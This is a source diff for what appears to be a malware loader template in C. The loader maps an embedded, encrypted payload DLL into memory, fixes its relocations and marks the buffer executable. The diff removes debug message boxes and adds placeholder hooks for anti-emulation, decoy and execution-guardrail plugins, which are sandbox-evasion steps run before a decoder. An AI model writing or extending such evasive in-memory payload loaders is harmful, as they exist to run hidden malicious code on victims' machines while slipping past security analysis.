@@ -122,8 +122,6 @@ DWORD_PTR load_dll(LPVOID dllBase, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 		for (DWORD i = 0; i < relocationsCount; i++)
 		{
 			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
-
-			// THIZ
 			if (relocationEntries[i].Type == 0)
 			{
 				continue;
@@ -134,14 +132,10 @@ DWORD_PTR load_dll(LPVOID dllBase, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 			//ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
 			DWORD_PTR* addressToPatch = (DWORD_PTR*)((BYTE*)dllBase + relocationRVA);
 			//DWORD_PTR value = *addressToPatch;
-
 			*addressToPatch += deltaImageBase;
 			//mymemcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
-
 		}
 	}
-
-	MessageBoxW(0, L"AAA2", L"AAA2", MB_OK);
 
 	// resolve import address table
 	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
@@ -187,26 +181,35 @@ DWORD_PTR load_dll(LPVOID dllBase, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 }
 
 
+{{plugin_antiemulation}}
+
+{{plugin_decoy}}
+
+{{plugin_executionguardrail}}
+
+
 int main()
 {
-	// char* dest = VirtualAlloc(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);
-	//char* dest = VirtualAlloc(0, 0x7000, 0x3000, PAGE_EXECUTE_READWRITE);
 	char* dest = supermega_payload;
 	DWORD protect, oldProtect;
-	protect = PAGE_EXECUTE_READWRITE;
-	VirtualProtect((LPVOID)dest, 0x7000, protect, &oldProtect);
 
-	MessageBoxW(0, L"ok virtualprotect", L"AAA2", MB_OK);
+	// Call: Execution Guardrail
+	if (executionguardrail() != 0) {
+		return 1;
+	}
 
+	// Call: Anti Emulation plugin
+	antiemulation();
+
+	// Call: Decoy plugin
+	decoy();
+
+	VirtualProtect((LPVOID)dest, 0x7000, PAGE_EXECUTE_READWRITE, &oldProtect);
 
 	// FROM supermega_payload[] 
 	// TO dest[]
 	// Including decryption
-{{ plugin_decoder }}
-
-
-	MessageBoxW(0, L"ok copy", L"AAA2", MB_OK);
-
+	{{ plugin_decoder }}
 
 	// Load the DLL at dest
 	DWORD_PTR dllBase;
